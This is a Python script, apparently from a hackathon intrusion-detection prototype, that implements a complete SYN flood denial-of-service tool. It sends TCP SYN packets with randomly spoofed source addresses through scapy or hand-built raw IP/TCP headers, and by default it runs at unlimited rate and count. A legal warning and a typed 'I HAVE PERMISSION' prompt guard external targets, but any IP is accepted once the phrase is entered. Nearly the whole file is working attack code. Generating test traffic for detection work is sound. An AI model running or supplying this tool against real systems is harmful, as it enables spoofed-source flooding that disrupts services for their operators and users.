#!/usr/bin/env python3
"""
EKADHARA Attack Script — SYN Flood
PS-26145 | SIH 2026 Hackathon Prototype

Sends raw TCP SYN packets with random spoofed source IPs to the target.
Generates real network traffic detectable by the EKADHARA monitoring pipeline.

Usage:
    python syn_flood.py --target <ip> --port <port> [--count <num>] [--rate <pps>] [--verbose]
"""

import argparse
import ipaddress
import os
import random
import socket
import struct
import sys
import threading
import time
from datetime import datetime

# ============================================================
# ANSI Color Codes (Windows Terminal compatible)
# ============================================================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

# ============================================================
# Scapy import (optional)
# ============================================================
try:
    from scapy.all import IP, TCP, send, RandShort
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# ============================================================
# Constants
# ============================================================
BANNER = f"""{BOLD}{MAGENTA}
╔══════════════════════════════════════════════════╗
║   EKADHARA Attack Traffic Generator             ║
║   SYN Flood — PS-26145 | SIH 2026               ║
╚══════════════════════════════════════════════════╝{RESET}"""

LEGAL_WARNING = (
    f"\n{RED}{BOLD}[!] LEGAL WARNING:{RESET}\n"
    f"    This tool generates REAL network packets.\n"
    f"    Only use against localhost (127.0.0.1) or IPs you OWN.\n"
    f"    Unauthorized scanning/flooding is ILLEGAL.\n"
)

# ============================================================
# Safety Checks
# ============================================================
def is_safe_target(ip_str):
    """Check if target is localhost or a private IP address."""
    try:
        ip = ipaddress.ip_address(ip_str)
        if ip.is_loopback:
            return True
        if ip.is_private:
            return True
        return False
    except ValueError:
        return False


def warn_external_target(ip_str):
    """Print warning if targeting an external IP."""
    if not is_safe_target(ip_str):
        print(f"\n{RED}{BOLD}[!!!] EXTERNAL TARGET DETECTED: {ip_str}{RESET}")
        print(f"    {YELLOW}This script is intended for localhost or private networks only.{RESET}")
        print(f"    {YELLOW}Ensure you have EXPLICIT WRITTEN PERMISSION from the target owner.{RESET}")
        confirm = input(f"\n    {BOLD}Type 'I HAVE PERMISSION' to proceed: {RESET}")
        if confirm.strip() != "I HAVE PERMISSION":
            print(f"{RED}Aborted.{RESET}")
            sys.exit(0)
        print(f"{YELLOW}Proceeding with external target...{RESET}\n")


# ============================================================
# Packet Generation (Scapy)
# ============================================================
def generate_random_ip():
    """Generate a random source IP address."""
    # Avoid reserved ranges and multicast
    first_octet = random.choice(
        list(range(1, 224)) + list(range(224, 239))
    )
    # Skip loopback, multicast, reserved
    if first_octet == 127:
        first_octet = random.randint(1, 126)
    if first_octet >= 224:
        first_octet = random.randint(1, 223)

    return f"{first_octet}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def syn_flood_scapy(target_ip, target_port, count, rate, verbose, stop_event, stats):
    """SYN flood using scapy."""
    if verbose:
        print(f"{CYAN}[SCAPY] Using scapy for packet crafting{RESET}")

    packets_sent = 0
    start_time = time.time()

    while not stop_event.is_set():
        if count > 0 and packets_sent >= count:
            break

        src_ip = generate_random_ip()
        src_port = random.randint(1024, 65535)

        # Craft SYN packet with random sequence number
        pkt = IP(src=src_ip, dst=target_ip) / TCP(
            sport=src_port,
            dport=target_port,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
            options=[
                ('MSS', 1460),
                ('SAckOK', b''),
                ('Timestamp', (random.randint(0, 1000000), 0)),
                ('NOP', None),
                ('WScale', 7),
            ]
        )

        try:
            send(pkt, verbose=False)
            packets_sent += 1
            stats['packets'] = packets_sent

            elapsed = time.time() - start_time
            if elapsed > 0:
                stats['rate'] = packets_sent / elapsed
            stats['duration'] = elapsed

            if verbose and packets_sent % 50 == 0:
                print(f"  {DIM}Sent {packets_sent} packets ({stats['rate']:.1f} pps){RESET}")

            # Rate limiting
            if rate > 0:
                time.sleep(1.0 / rate)

        except Exception as e:
            if verbose:
                print(f"  {RED}Error sending packet: {e}{RESET}")


# ============================================================
# Packet Generation (Raw Sockets fallback)
# ============================================================
def checksum(data):
    """Compute ICMP-like checksum for TCP header."""
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if len(data) % 2:
        s += data[-1] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def syn_flood_raw(target_ip, target_port, count, rate, verbose, stop_event, stats):
    """SYN flood using raw sockets (no scapy needed)."""
    if verbose:
        print(f"{CYAN}[RAW SOCKET] Using raw sockets for packet crafting{RESET}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"{RED}[ERROR] Raw sockets require Administrator/Root privileges.{RESET}")
        print(f"{YELLOW}    Run with: sudo python syn_flood.py ...{RESET}")
        return

    packets_sent = 0
    start_time = time.time()

    while not stop_event.is_set():
        if count > 0 and packets_sent >= count:
            break

        src_ip = generate_random_ip()
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(0, 2**32 - 1)

        # ---- IP Header ----
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40  # 20 (IP) + 20 (TCP)
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(target_ip)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
            ip_id, ip_frag_off, ip_ttl, ip_proto,
            ip_check, ip_saddr, ip_daddr
        )

        # ---- TCP Header ----
        tcp_source = src_port
        tcp_dest = target_port
        tcp_seq = seq_num
        tcp_ack_seq = 0
        tcp_doff = 5  # 5 * 4 = 20 bytes
        tcp_flags = 0x02  # SYN flag
        tcp_window = 65535
        tcp_check = 0
        tcp_urg_ptr = 0

        tcp_header = struct.pack(
            "!HHLLBBHHH",
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
            (tcp_doff << 4), tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr
        )

        # ---- Pseudo-header for checksum ----
        pseudo_header = ip_saddr + ip_daddr + struct.pack("!BBH", 0, ip_proto, len(tcp_header))
        tcp_check = checksum(pseudo_header + tcp_header)

        # Rebuild TCP header with correct checksum
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
            (tcp_doff << 4), tcp_flags, tcp_window,
            tcp_check, tcp_urg_ptr
        )

        packet = ip_header + tcp_header

        try:
            sock.sendto(packet, (target_ip, 0))
            packets_sent += 1
            stats['packets'] = packets_sent

            elapsed = time.time() - start_time
            if elapsed > 0:
                stats['rate'] = packets_sent / elapsed
            stats['duration'] = elapsed

            if verbose and packets_sent % 50 == 0:
                print(f"  {DIM}Sent {packets_sent} packets ({stats['rate']:.1f} pps){RESET}")

            if rate > 0:
                time.sleep(1.0 / rate)

        except Exception as e:
            if verbose:
                print(f"  {RED}Error: {e}{RESET}")

    sock.close()


# ============================================================
# Stats Display
# ============================================================
def display_stats(stop_event, start_time, target_ip, target_port, verbose):
    """Periodic stats display thread."""
    while not stop_event.is_set():
        time.sleep(1.0)
        elapsed = time.time() - start_time
        pkt = stats['packets']
        rate = stats['rate']
        duration = stats['duration']
        pkt_str = f"{BOLD}{WHITE}{pkt}{RESET}"
        rate_str = f"{BOLD}{CYAN}{rate:.1f}{RESET}"
        dur_str = f"{BOLD}{YELLOW}{duration:.1f}s{RESET}"
        tgt_str = f"{BOLD}{GREEN}{target_ip}:{target_port}{RESET}"

        # Use \r for in-place update
        print(
            f"\r{BOLD}[SYN FLOOD]{RESET} Target: {tgt_str} | "
            f"Packets: {pkt_str} | Rate: {rate_str} pps | "
            f"Duration: {dur_str}  ",
            end="",
            flush=True
        )


# ============================================================
# Main Entry Point
# ============================================================
def run_attack(**kwargs):
    """
    Main entry point for the SYN flood attack.

    Accepts kwargs dict with keys:
        target (str): Target IP address
        port (int): Target port
        count (int): Number of packets (0 = unlimited)
        rate (int): Packets per second (0 = unlimited)
        verbose (bool): Enable verbose output
    """
    target = kwargs.get('target', '127.0.0.1')
    port = kwargs.get('port', 80)
    count = kwargs.get('count', 0)
    rate = kwargs.get('rate', 0)
    verbose = kwargs.get('verbose', False)

    print(BANNER)
    print(LEGAL_WARNING)

    warn_external_target(target)

    # Shared stats
    global stats
    stats = {'packets': 0, 'rate': 0.0, 'duration': 0.0}

    stop_event = threading.Event()
    start_time = time.time()

    method = f"{GREEN}scapy{RESET}" if HAS_SCAPY else f"{YELLOW}raw sockets{RESET}"
    print(f"\n{BOLD}[*] Target:{RESET}    {target}:{port}")
    print(f"{BOLD}[*] Method:{RESET}    {method}")
    print(f"{BOLD}[*] Count:{RESET}     {'Unlimited' if count == 0 else count}")
    print(f"{BOLD}[*] Rate:{RESET}      {'Unlimited' if rate == 0 else f'{rate} pps'}")
    print(f"{BOLD}[*] Start:{RESET}     {datetime.now().strftime('%H:%M:%S')}")
    print(f"\n{BOLD}{RED}Press Ctrl+C to stop.{RESET}\n")

    # Start stats display thread
    stats_thread = threading.Thread(
        target=display_stats,
        args=(stop_event, start_time, target, port, verbose),
        daemon=True
    )
    stats_thread.start()

    # Start attack thread
    if HAS_SCAPY:
        attack_thread = threading.Thread(
            target=syn_flood_scapy,
            args=(target, port, count, rate, verbose, stop_event, stats),
            daemon=True
        )
    else:
        attack_thread = threading.Thread(
            target=syn_flood_raw,
            args=(target, port, count, rate, verbose, stop_event, stats),
            daemon=True
        )

    attack_thread.start()

    try:
        while attack_thread.is_alive():
            attack_thread.join(timeout=1)
    except KeyboardInterrupt:
        print(f"\n\n{BOLD}{YELLOW}[*] Stopping SYN flood...{RESET}")
        stop_event.set()
        attack_thread.join(timeout=2)

    # Final summary
    elapsed = time.time() - start_time
    print(f"\n\n{BOLD}{GREEN}{'='*50}{RESET}")
    print(f"{BOLD}{GREEN}  SYN FLOOD SUMMARY{RESET}")
    print(f"{BOLD}{GREEN}{'='*50}{RESET}")
    print(f"  Target:          {target}:{port}")
    print(f"  Packets sent:    {stats['packets']}")
    print(f"  Avg rate:        {stats['packets']/elapsed:.1f} pps" if elapsed > 0 else "  Avg rate:        N/A")
    print(f"  Duration:        {elapsed:.1f}s")
    print(f"  Method:          {'scapy' if HAS_SCAPY else 'raw sockets'}")
    print(f"{BOLD}{GREEN}{'='*50}{RESET}")


# ============================================================
# CLI
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="EKADHARA SYN Flood Attack Generator — PS-26145",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python syn_flood.py --target 127.0.0.1 --port 8080
  python syn_flood.py --target 127.0.0.1 --port 8080 --count 1000 --rate 500
  python syn_flood.py --target 127.0.0.1 --port 8080 --verbose
        """
    )
    parser.add_argument('--target', required=True, help='Target IP address')
    parser.add_argument('--port', type=int, required=True, help='Target port')
    parser.add_argument('--count', type=int, default=0, help='Number of packets (0=unlimited)')
    parser.add_argument('--rate', type=int, default=0, help='Packets per second (0=unlimited)')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()
    run_attack(
        target=args.target,
        port=args.port,
        count=args.count,
        rate=args.rate,
        verbose=args.verbose
    )


if __name__ == '__main__':
    main()
